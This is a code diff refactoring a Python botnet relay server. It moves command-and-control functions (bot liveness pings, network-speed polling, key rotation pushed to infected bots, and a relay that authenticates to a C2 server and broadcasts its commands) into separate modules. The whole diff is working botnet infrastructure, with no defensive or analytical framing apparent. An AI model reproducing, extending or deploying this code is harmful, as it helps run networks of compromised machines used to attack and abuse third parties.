@@ -8,8 +8,9 @@ from colorama import Fore, init
 import hashlib
 from cryptography.fernet import Fernet
 import requests
-from modules.config import rl_config_t as tconf, rl_config_addr as addrconf, c2_config_addr as c2addrconf
-import random
+from modules.config import rl_config_addr as addrconf, c2_config_addr as c2addrconf
+from modules.loops import Loops as loop
+from modules.relay import Relay as rl
 
 
 
@@ -48,15 +49,6 @@ rd=Fore.RED
 
 
 
-def cryptD(msg: str, encde=True):
-    if encde:
-        msg=fer.encrypt(msg)
-    else: 
-        msg=fer.decrypt(msg)
-    return msg
-
-
-
 def find_login(username: str, password: str):
     password=hashlib.sha256(password.encode()).hexdigest()
     req=f"{api_url}/login.php?urlkey={urlkey}&usr={username}&pass={password}"
@@ -90,195 +82,6 @@ def broadcast(data: str):
     for bot in dead_bots:
         bots.pop(bot)
         bot.close()
-
-
-
-def ping():
-    while 1:
-        dead_bots = []
-        for bot in bots.keys():
-            try:
-                bot.settimeout(3)
-                send(bot, 'PING', False, False)
-                if bot.recv(1024).decode() != f'PONG[p:{passwd}]':
-                    dead_bots.append(bot)
-            except:
-                dead_bots.append(bot)
-            
-        for bot in dead_bots:
-            bots.pop(bot)
-            bot.close()
-        time.sleep(tconf.ping_t)
-
-
-
-def net():
-    while 1:
-        while speed!=[]:
-            for i in speed:
-                speed.remove(i)
-        dead_bots = []
-        for bot in bots.keys():
-            try:
-                bot.settimeout(3)
-                send(bot, f'NETSPEED', False, False)
-                data=bot.recv(1024).decode()
-                try:
-                    if not int(data):
-                        dead_bots.append(bot)
-                    else:
-                        speed.append(int(data))
-                except:
-                    speed.append(int(data))
-            except:
-                dead_bots.append(bot)
-            
-        for bot in dead_bots:
-            bots.pop(bot)
-            bot.close()
-        time.sleep(tconf.net_t)
-
-
-
-def api_key(gkey: str):
-    url=f"{api_url}/genkey.php?urlkey={urlkey}&gkey={gkey}"
-    try:
-        r=requests.get(url).json()
-        print(r)
-        if r=="ok":
-            return True
-        else:
-            return False
-    except Exception as e:
-        print(f"error \n{url}\n{e}\n\n")
-
-
-
-def genkey():
-    while 1:
-        time.sleep(tconf.genkey_t)
-        while gkey!=[]:
-            for i in gkey:
-                gkey.remove(i)
-        ngkey=Fernet.generate_key().decode()
-        print(ngkey)
-        gkey.append(ngkey)
-        k=[]
-        ke=[]
-        if ogkey!=[]:
-            f=Fernet(ogkey)
-            k.append(f.encrypt(f'GKEY:[{ngkey}]'.encode()).decode())
-            for i in k:
-                if api_key(i):
-                    print("apikey op")
-                else:
-                    print("apikey error")
-        else:
-            ke.append(fer.encrypt(f'GKEY:[{ngkey}]'.encode()).decode())
-            for i in ke:
-                if api_key(i):
-                    print("apikey op")
-                else:
-                    print("apikey error")
-        dead_bots=[]
-        for bot in bots.keys():
-            try:
-                bot.settimeout(3)
-                if k!=[]:
-                    for i in k:
-                        send(bot, i, False, False)
-                elif ke!=[]:
-                    for i in ke:
-                        send(bot, f"GK{i}", False, False)
-                else:
-                    print("error")
-            except:
-                dead_bots.append(bot)
-            
-        for bot in dead_bots:
-            bots.pop(bot)
-            bot.close()
-
-
-
-def save():
-    while 1:
-        time.sleep(tconf.save_t)
-
-
-
-def relay():
-    c2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-    print("relay starting...")
-    while 1:
-            try:
-                c2.connect(C2)
-                print("relay online")
-                
-                while 1:
-                    data = c2.recv(1024).decode()
-                    if 'Username' in data:
-                        c2.send(f'RELAY[p:{relaykey}]'.encode())
-                        break
-
-                while 1:
-                    data = c2.recv(1024).decode()
-                    if 'Password' in data:
-                        c2.send(f'{relaykey}'.encode())
-                        break
-
-                break
-            except:
-                print("relay offline")
-                time.sleep(tconf.relay_t)
-
-    while 1:
-        try:
-            data = c2.recv(1024).decode()
-            if not data:
-                break
-            print(data)
-            args = data.split(' ')
-            command = args[0].upper()
-
-            if command =='RPING':
-                print("rping")
-                c2.send(f'RPONG[p:{relaykey}]'.encode())
-            
-            elif command=='RNETSPEED':
-                print("rnetspeed")
-                c2.send(f"{round(sum(speed))}".encode())
-            
-            elif command=='RNETBOTS':
-                print("rnetbots")
-                c2.send(f"{len(bots)}".encode())
-            
-            elif dict(data):
-                print("rsmsg")
-                try:
-                    data=dict(data)
-                    fbot=random.choice(bots).getpeername()[0]
-                    data['enc']={'ip': fbot, 'ip': random.choice(bots).getpeername()[0], 'ip': random.choice(bots).getpeername()[0], 'ip': random.choice(bots).getpeername()[0]}
-                    data['dec']={'ip': random.choice(bots).getpeername()[0], 'ip': random.choice(bots).getpeername()[0], 'ip': random.choice(bots).getpeername()[0], 'ip': random.choice(bots).getpeername()[0]}
-                    print(data)
-                    addr=(str(fbot), 3630)
-                    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect(addr)
-                    s.send(str(data).encode())
-                    c2.send(f"SMSG[p:{relaykey}]")
-                except:
-                    print("smsg error")
-            
-            else:
-                broadcast(data)
-                
-        except:
-            print("break")
-            break
-
-    c2.close()
-    relay()
     
 
 
@@ -358,10 +161,10 @@ def main():
         exit()
 
     sock.listen()
-    threading.Thread(target=ping).start()
-    threading.Thread(target=net).start()
-    threading.Thread(target=genkey).start()
-    threading.Thread(target=relay).start()
+    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, fer=fer, gkey=gkey, speed=speed, ogkey=ogkey, passwd=passwd, relaykey=relaykey, bots=bots).ping).start()
+    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, fer=fer, gkey=gkey, speed=speed, ogkey=ogkey, passwd=passwd, relaykey=relaykey, bots=bots).net).start()
+    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, fer=fer, gkey=gkey, speed=speed, ogkey=ogkey, passwd=passwd, relaykey=relaykey, bots=bots).genkey).start()
+    threading.Thread(target=rl(relaykey=relaykey, C2=C2, speed=speed, bots=bots).relay).start()
 
     while 1:
         threading.Thread(target=handle_client, args=[*sock.accept()]).start()
